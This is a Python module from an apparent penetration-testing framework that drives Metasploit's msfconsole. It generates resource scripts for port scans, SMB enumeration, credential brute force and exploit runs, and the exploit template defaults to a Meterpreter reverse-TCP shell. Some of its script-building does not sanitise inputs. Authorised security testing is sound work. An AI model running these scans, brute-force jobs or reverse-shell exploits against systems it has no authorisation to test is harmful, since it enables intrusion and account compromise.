"""
Metasploit Console Wrapper

Provides native msfconsole interaction via subprocess with resource script auto-generation.
"""

import asyncio
import os
import structlog
import tempfile
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Callable, Union
from enum import Enum

from urban_hs.modules.metasploit.rpc import (
    MsfModuleType,
    MsfSession,
    MsfModule,
)

logger = structlog.get_logger(__name__)


class ConsoleOutputType(Enum):
    """Types of console output."""
    STDOUT = "stdout"
    STDERR = "stderr"
    PROMPT = "prompt"
    ERROR = "error"


@dataclass
class ConsoleResult:
    """Result of console command execution."""
    command: str
    output: str
    error: str
    returncode: int
    duration_ms: int
    timed_out: bool = False


@dataclass
class ResourceScript:
    """Metasploit resource script (.rc file)."""
    name: str
    content: str
    path: Optional[str] = None
    created_at: datetime = field(default_factory=datetime.utcnow)
    
    def save(self, directory: Optional[str] = None) -> str:
        """Save script to file."""
        if directory is None:
            directory = tempfile.gettempdir()
        
        os.makedirs(directory, exist_ok=True)
        filename = f"{self.name}_{int(time.time())}.rc"
        filepath = os.path.join(directory, filename)
        
        with open(filepath, 'w') as f:
            f.write(self.content)
        
        self.path = filepath
        return filepath


class MetasploitConsole:
    """
    Wrapper for native msfconsole interaction.
    
    Features:
    - Execute msfconsole with resource scripts
    - Auto-generate resource scripts from templates
    - Streaming output with callbacks
    - Session management
    - Module execution via console
    """
    
    def __init__(
        self,
        msfconsole_path: str = "msfconsole",
        resource_dir: Optional[str] = None,
        timeout: int = 300,
    ):
        self.msfconsole_path = msfconsole_path
        self.resource_dir = resource_dir or os.path.join(tempfile.gettempdir(), "urban-hs-msf-resources")
        self.timeout = timeout
        
        os.makedirs(self.resource_dir, exist_ok=True)
        
        self._process: Optional[asyncio.subprocess.Process] = None
        self._active = False
    
    async def execute_rc_script(
        self,
        script: Union[str, ResourceScript],
        timeout: Optional[int] = None,
        on_output: Optional[Callable[[str, str], None]] = None,
    ) -> ConsoleResult:
        """
        Execute a resource script via msfconsole.
        
        Args:
            script: ResourceScript object or path to .rc file
            timeout: Execution timeout in seconds
            on_output: Callback for streaming output (stream_type, line)
        """
        start_time = time.time()
        timeout = timeout or self.timeout
        
        # Get script path
        if isinstance(script, ResourceScript):
            script_path = script.path or script.save(self.resource_dir)
        else:
            script_path = script
        
        if not os.path.exists(script_path):
            return ConsoleResult(
                command=f"msfconsole -r {script_path}",
                output="",
                error=f"Resource script not found: {script_path}",
                returncode=-1,
                duration_ms=0,
            )
        
        cmd = [self.msfconsole_path, "-q", "-r", script_path]
        cmd_str = " ".join(cmd)
        
        logger.info("Executing msfconsole resource script", script=script_path)
        
        try:
            self._process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                limit=1024 * 1024,
            )
            
            self._active = True
            
            stdout_lines = []
            stderr_lines = []
            
            async def read_stream(stream, stream_name, lines_list):
                while True:
                    line = await stream.readline()
                    if not line:
                        break
                    decoded = line.decode(errors="replace").rstrip()
                    lines_list.append(decoded)
                    if on_output:
                        on_output(stream_name, decoded)
            
            stdout_task = asyncio.create_task(read_stream(self._process.stdout, "stdout", stdout_lines))
            stderr_task = asyncio.create_task(read_stream(self._process.stderr, "stderr", stderr_lines))
            
            try:
                await asyncio.wait_for(
                    asyncio.gather(stdout_task, stderr_task, self._process.wait()),
                    timeout=timeout
                )
                returncode = self._process.returncode
                timed_out = False
            except asyncio.TimeoutError:
                logger.warning("msfconsole timeout", timeout=timeout)
                self._process.kill()
                await self._process.wait()
                returncode = -1
                timed_out = True
            
        except Exception as e:
            logger.error("msfconsole execution failed", error=str(e))
            return ConsoleResult(
                command=cmd_str,
                output="",
                error=str(e),
                returncode=-1,
                duration_ms=0,
            )
        finally:
            self._active = False
            self._process = None
        
        duration_ms = int((time.time() - start_time) * 1000)
        
        return ConsoleResult(
            command=cmd_str,
            output="\n".join(stdout_lines),
            error="\n".join(stderr_lines),
            returncode=returncode if returncode is not None else -1,
            duration_ms=duration_ms,
            timed_out=timed_out,
        )
    
    async def execute_command(
        self,
        command: str,
        timeout: Optional[int] = None,
        on_output: Optional[Callable[[str, str], None]] = None,
    ) -> ConsoleResult:
        """Execute a single command in interactive msfconsole."""
        script = ResourceScript(
            name="interactive_cmd",
            content=f"{command}\nexit\n",
        )
        return await self.execute_rc_script(script, timeout, on_output)
    
    async def run_exploit(
        self,
        exploit_module: str,
        target: str,
        payload: Optional[str] = None,
        options: Optional[Dict[str, Any]] = None,
        payload_options: Optional[Dict[str, Any]] = None,
        timeout: Optional[int] = None,
        on_output: Optional[Callable[[str, str], None]] = None,
    ) -> ConsoleResult:
        """Run exploit module via console."""
        lines = [
            f"use {exploit_module}",
        ]
        
        opts = options or {}
        opts["RHOSTS"] = target
        for k, v in opts.items():
            # Sanitize to prevent command injection in resource script
            v_str = str(v)
            if '\n' in v_str or '\r' in v_str:
                raise ValueError(f"Value for option '{k}' contains newline/carriage return")
            lines.append(f"set {k} {v_str}")
        
        if payload:
            lines.append(f"set PAYLOAD {payload}")
        if payload_options:
            for k, v in payload_options.items():
                lines.append(f"set {k} {v}")
        
        lines.extend([
            "exploit -z",  # Run in background
            "sessions -l",
            "exit",
        ])
        
        script = ResourceScript(
            name=f"exploit_{exploit_module.replace('/', '_')}",
            content="\n".join(lines),
        )
        
        return await self.execute_rc_script(script, timeout, on_output)
    
    def generate_rc_script(
        self,
        name: str,
        commands: List[str],
    ) -> ResourceScript:
        """Generate a resource script from commands."""
        content = "\n".join(commands) + "\n"
        return ResourceScript(name=name, content=content)
    
    # Pre-built script templates
    
    @staticmethod
    def template_port_scan(target: str, ports: str = "1-1000") -> ResourceScript:
        """Generate port scan resource script."""
        return ResourceScript(
            name=f"port_scan_{target.replace('.', '_').replace('/', '_')}",
            content=f"""use auxiliary/scanner/portscan/tcp
set RHOSTS {target}
set PORTS {ports}
set THREADS 50
run
exit
""",
        )
    
    @staticmethod
    def template_vuln_scan(target: str) -> ResourceScript:
        """Generate vulnerability scan resource script."""
        return ResourceScript(
            name=f"vuln_scan_{target.replace('.', '_').replace('/', '_')}",
            content=f"""use auxiliary/scanner/smb/smb_version
set RHOSTS {target}
run

use auxiliary/scanner/ssh/ssh_version
set RHOSTS {target}
run

use auxiliary/scanner/http/http_version
set RHOSTS {target}
run
exit
""",
        )
    
    @staticmethod
    def template_smb_enum(target: str) -> ResourceScript:
        """Generate SMB enumeration resource script."""
        return ResourceScript(
            name=f"smb_enum_{target.replace('.', '_')}",
            content=f"""use auxiliary/scanner/smb/smb_version
set RHOSTS {target}
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS {target}
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS {target}
run
exit
""",
        )
    
    @staticmethod
    def template_brute_force(
        target: str,
        service: str,
        user_file: str,
        pass_file: str,
    ) -> ResourceScript:
        """Generate credential brute force resource script."""
        return ResourceScript(
            name=f"brute_{service}_{target.replace('.', '_')}",
            content=f"""use auxiliary/scanner/{service}/{service}_login
set RHOSTS {target}
set USER_FILE {user_file}
set PASS_FILE {pass_file}
set THREADS 10
run
exit
""",
        )
    
    @staticmethod
    def template_exploit_chain(exploit: str, target: str, payload: str = "windows/meterpreter/reverse_tcp", lhost: str = "127.0.0.1", lport: int = 4444) -> ResourceScript:
        """Generate exploit chain resource script."""
        return ResourceScript(
            name=f"exploit_{exploit.replace('/', '_')}_{target.replace('.', '_')}",
            content=f"""use {exploit}
set RHOSTS {target}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
exploit -z
sessions -l
exit
""",
        )
    
    # Control
    
    def is_active(self) -> bool:
        return self._active
    
    def kill(self):
        """Kill active msfconsole process."""
        if self._process and self._active:
            self._process.kill()
            self._active = False


# Export all public classes
__all__ = [
    "ConsoleOutputType",
    "ConsoleResult",
    "ResourceScript",
    "MetasploitConsole",
]